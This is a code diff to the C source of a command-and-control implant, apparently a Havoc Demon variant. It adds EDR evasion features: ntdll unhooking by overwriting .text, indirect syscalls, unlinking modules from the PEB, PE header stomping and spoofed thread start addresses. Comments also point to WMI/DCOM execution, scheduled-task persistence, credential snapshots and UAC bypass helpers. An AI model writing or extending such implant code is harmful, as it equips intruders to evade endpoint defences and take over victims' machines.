@@ -7,10 +7,12 @@
 /* Import Core Headers */
 #include <core/Transport.h>
 #include <core/SleepObf.h>
+#include <core/PeProtect.h>
 #include <core/Win32.h>
 #include <core/MiniStd.h>
 #include <core/SysNative.h>
 #include <core/Runtime.h>
+#include <core/MemoryHide.h>
 #include <core/TransportDns.h>
 
 /* Import Inject Headers */
@@ -24,6 +26,9 @@
 
 /* [HVC-014 2026-04-28] AES-256-CTR for encrypted CONFIG_BYTES embedding. */
 #include <crypt/AesCrypt.h>
+
+/* [HVC-031 Sub-4] ntdll unhook — strip EDR inline hooks at startup. */
+#include <core/NtdllUnhook.h>
 
 /* Global Variables */
 SEC_DATA PINSTANCE Instance      = { 0 };
@@ -88,6 +93,12 @@ VOID DemonRoutine()
                 /* reset the failure counter since we managed to connect to it. */
                 Instance->Config.Transport.Host->Failures = 0;
 #endif
+                /* Session.Connected is TRUE here — DemonPrintf works.
+                 * Log the ntdll unhook result so --debug-dev users can confirm status. */
+                if ( Instance->Config.Implant.UnhookNtdll ) {
+                    PRINTF( "[UnhookNtdll] ntdll .text overwrite: %s\n",
+                            Instance->Session.bNtdllUnhooked ? "SUCCESS" : "FAILED" )
+                }
             }
         }
 
@@ -320,6 +331,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
             RtNetApi32,
             RtWs2_32,
             RtSspicli,
+            RtOle32,        /* [HVC-032] COM for WMI exec, DCOM exec, persist schtask */
 #ifdef TRANSPORT_HTTP
             RtWinHttp,
 #endif
@@ -400,6 +412,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.NtAlertResumeThread               = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTALERTRESUMETHREAD );
         Instance->Win32.NtSignalAndWaitForSingleObject    = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT );
         Instance->Win32.NtTestAlert                       = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTTESTALERT );
+        Instance->Win32.RtlUserThreadStart                = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_RTLUSERTHREADSTART );
         Instance->Win32.NtCreateThreadEx                  = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTCREATETHREADEX );
         Instance->Win32.NtOpenProcessToken                = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTOPENPROCESSTOKEN );
         Instance->Win32.NtDuplicateToken                  = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTDUPLICATETOKEN );
@@ -473,6 +486,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.ReadFile                        = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_READFILE );
         Instance->Win32.VirtualAllocEx                  = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_VIRTUALALLOCEX );
         Instance->Win32.WaitForSingleObjectEx           = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_WAITFORSINGLEOBJECTEX );
+        Instance->Win32.BaseThreadInitThunk             = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_BASETHREADINITTHUNK );
         Instance->Win32.GetComputerNameExA              = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETCOMPUTERNAMEEXA );
         Instance->Win32.GetExitCodeProcess              = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETEXITCODEPROCESS );
         Instance->Win32.GetExitCodeThread               = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETEXITCODETHREAD );
@@ -515,18 +529,45 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.AttachConsole                   = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_ATTACHCONSOLE );
         Instance->Win32.WriteConsoleA                   = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_WRITECONSOLEA );
         Instance->Win32.GlobalFree                      = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GLOBALFREE );
+
+        /* [HVC-032] Kernel32 — snapshot / path helpers for creds and UAC bypass */
+        Instance->Win32.GetTempPathW                    = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETTEMPPATHW );
+        Instance->Win32.PssCaptureSnapshot              = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_PSSCAPTURESNAPSHOT );
+        Instance->Win32.PssFreeSnapshot                 = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_PSSFREESNAPSHOT );
     }
 
     /* now that we loaded some of the basic apis lets parse the config and see how we load the rest */
+
+#ifdef DEBUG
+    /* Bootstrap msvcrt early so vsnprintf is available for PRINTF/PUTS inside
+     * DemonConfig() and UnhookNtdll(), which run before the shuffled RtModules loop.
+     * Production builds skip this — RtMsvcrt runs in the loop as usual. */
+    RtMsvcrt();
+#endif
+
     /* Parse config */
     DemonConfig();
 
-    /* now do post init stuff after parsing the config */
+    /* Initialize indirect syscalls before UnhookNtdll — UnhookNtdll uses SysNtProtectVirtualMemory
+     * to bypass the EDR hook on NtProtectVirtualMemory. SYSCALL_INVOKE requires SysAddress and
+     * the NtProtectVirtualMemory SSN to be populated; SysInitialize provides both.
+     * SysInitialize only needs Instance->Modules.Ntdll which is available at this point. */
     if ( Instance->Config.Implant.SysIndirect )
     {
-        /* Initialize indirect syscalls + get SSN from every single syscall we need */
         if  ( ! SysInitialize( Instance->Modules.Ntdll ) ) {
             PUTS( "Failed to Initialize syscalls" )
+            /* NOTE: the agent is going to keep going for now. */
+        }
+    }
+
+    /* [HVC-031 Sub-4] strip EDR inline hooks from ntdll .text before injection/network code.
+     * Result is stored in Session.bNtdllUnhooked and logged once Session.Connected is TRUE. */
+    if ( Instance->Config.Implant.UnhookNtdll ) {
+        Instance->Session.bNtdllUnhooked = UnhookNtdll();
+        if ( Instance->Session.bNtdllUnhooked ) {
+            PUTS( "Successfully unhooked ntdll.dll" )
+        } else {
+            PUTS( "Failed to unhook ntdll.dll" )
             /* NOTE: the agent is going to keep going for now. */
         }
     }
@@ -574,7 +615,13 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         }
 
         if ( Instance->Session.ModuleBase ) {
-            Instance->Session.ModuleSize = IMAGE_SIZE( Instance->Session.ModuleBase );
+            /* ISS-007: validate MZ signature before reading PE headers - a KaynLdr headerless
+             * mapping has live .text at offset 0, not IMAGE_DOS_HEADER; reading e_lfanew from
+             * code bytes produces a garbage RVA and an AV on the NT headers dereference */
+            if ( *(PWORD)Instance->Session.ModuleBase == IMAGE_DOS_SIGNATURE )
+                Instance->Session.ModuleSize = IMAGE_SIZE( Instance->Session.ModuleBase );
+            else
+                Instance->Session.ModuleSize = 0;
         }
     }
 
@@ -637,6 +684,9 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 
     PRINTF( "Instance DemonID => %x\n", Instance->Session.AgentID )
 
+    /* PeProtect_Init gates on Config.Implant.PeStomp internally (ISS-037) */
+    PeProtect_Init();
+
     PUTS( "============================================================" )
     PUTS( "===== DemonInit COMPLETE =====" )
     PUTS( "============================================================" )
@@ -649,6 +699,14 @@ VOID DemonConfig()
     ULONG  Temp   = 0;
     UINT32 Length = 0;
     DWORD  J      = 0;
+    /* profile-set sleep-obf start addr library (parser buf ptr, valid until ParserDestroy) */
+    PCHAR  SleepObfLib      = NULL;
+    PCHAR  SleepObfFunc     = NULL;
+    UINT32 SleepObfOffset   = 0;
+    /* profile-set inject spoof addr library (parser buf ptr, valid until ParserDestroy) */
+    PCHAR  InjectSpoofLib    = NULL;
+    PCHAR  InjectSpoofFunc   = NULL;
+    UINT32 InjectSpoofOffset = 0;
 
     PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )
 
@@ -712,6 +770,35 @@ VOID DemonConfig()
     Instance->Config.Implant.ProxyLoading       = ParserGetInt32( &Parser );
     Instance->Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
     Instance->Config.Implant.AmsiEtwPatch       = ParserGetInt32( &Parser );
+    /* RandGadget — TRUE means ObfTimer picks a new random gadget each sleep cycle */
+    Instance->Config.Implant.RandGadget         = ParserGetInt32( &Parser );
+    /* UnhookNtdll — TRUE means overwrite loaded ntdll .text with clean KnownDlls copy */
+    Instance->Config.Implant.UnhookNtdll        = ParserGetInt32( &Parser );
+    /* HideModules — TRUE means unlink dynamically loaded modules from PEB LDR lists */
+    Instance->Config.Implant.HideModules        = ParserGetInt32( &Parser );
+    /* PeStomp — TRUE means stomp PE header region during default sleep; off by default (ISS-037 fix) */
+    Instance->Config.Implant.PeStomp            = ParserGetInt32( &Parser );
+
+    /* Verbose - enable verbose debug logging (profile-configured) */
+    Instance->Config.Implant.Verbose        = ParserGetInt32( &Parser );
+    /* CoffeeVeh - enable VEH for BOF object file loading */
+    Instance->Config.Implant.CoffeeVeh      = ParserGetInt32( &Parser );
+    /* CoffeeThreaded - enable threaded BOF execution */
+    Instance->Config.Implant.CoffeeThreaded = ParserGetInt32( &Parser );
+
+    /* Read profile-optional start address specs (pointers into parser heap buf, valid until ParserDestroy) */
+    {
+        UINT32 Len = 0;
+        /* Len <= 1: EncodeUTF8 always appends \0, so an empty field has Len=1 (just the null byte).
+         * Treat both Len==0 (no bytes) and Len==1 (null-only) as "not configured". */
+        SleepObfLib    = ParserGetString( &Parser, &Len ); if ( Len <= 1 || !SleepObfLib[0] ) SleepObfLib = NULL;
+        SleepObfFunc   = ParserGetString( &Parser, &Len ); if ( Len <= 1 || !SleepObfFunc[0] ) SleepObfFunc = NULL;
+        SleepObfOffset = ParserGetInt32( &Parser );
+        InjectSpoofLib  = ParserGetString( &Parser, &Len ); if ( Len <= 1 || !InjectSpoofLib[0] ) InjectSpoofLib = NULL;
+        InjectSpoofFunc = ParserGetString( &Parser, &Len ); if ( Len <= 1 || !InjectSpoofFunc[0] ) InjectSpoofFunc = NULL;
+        InjectSpoofOffset = ParserGetInt32( &Parser );
+    }
+
 #ifdef TRANSPORT_HTTP
     Instance->Config.Implant.DownloadChunkSize  = 0x80000; /* 512k */
 #else
@@ -925,8 +1012,32 @@ VOID DemonConfig()
      * Windows version, and produces no image-load callback. Resolve via the
      * already-populated function table.
      * See BUG-FOL-3 in SleepObf-Analysis.md §8. */
-    Instance->Config.Implant.ThreadStartAddr = Instance->Win32.NtTestAlert;
+    Instance->Config.Implant.ThreadStartAddr = Instance->Win32.RtlUserThreadStart;
     Instance->Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;
+
+    /* Override ThreadStartAddr with profile-specified address if configured (parser ptrs still valid) */
+    if ( SleepObfLib && SleepObfFunc ) {
+        PVOID hMod = LdrModuleLoad( SleepObfLib );
+        if ( hMod ) {
+            PVOID Addr = LdrFunctionAddr( hMod, HashStringA( SleepObfFunc ) );
+            if ( Addr ) {
+                Instance->Config.Implant.ThreadStartAddr = (PVOID)( (ULONG_PTR)Addr + SleepObfOffset );
+                PRINTF( "SleepObfStartAddr: %s!%s+0x%x resolved\n", SleepObfLib, SleepObfFunc, SleepObfOffset )
+            }
+        }
+    }
+
+    /* Override SpoofAddr with profile-specified address if configured */
+    if ( InjectSpoofLib && InjectSpoofFunc ) {
+        PVOID hMod = LdrModuleLoad( InjectSpoofLib );
+        if ( hMod ) {
+            PVOID Addr = LdrFunctionAddr( hMod, HashStringA( InjectSpoofFunc ) );
+            if ( Addr ) {
+                Instance->Config.Inject.SpoofAddr = (PVOID)( (ULONG_PTR)Addr + InjectSpoofOffset );
+                PRINTF( "InjectSpoofAddr: %s!%s+0x%x resolved\n", InjectSpoofLib, InjectSpoofFunc, InjectSpoofOffset )
+            }
+        }
+    }
 
     ParserDestroy( &Parser );
 }
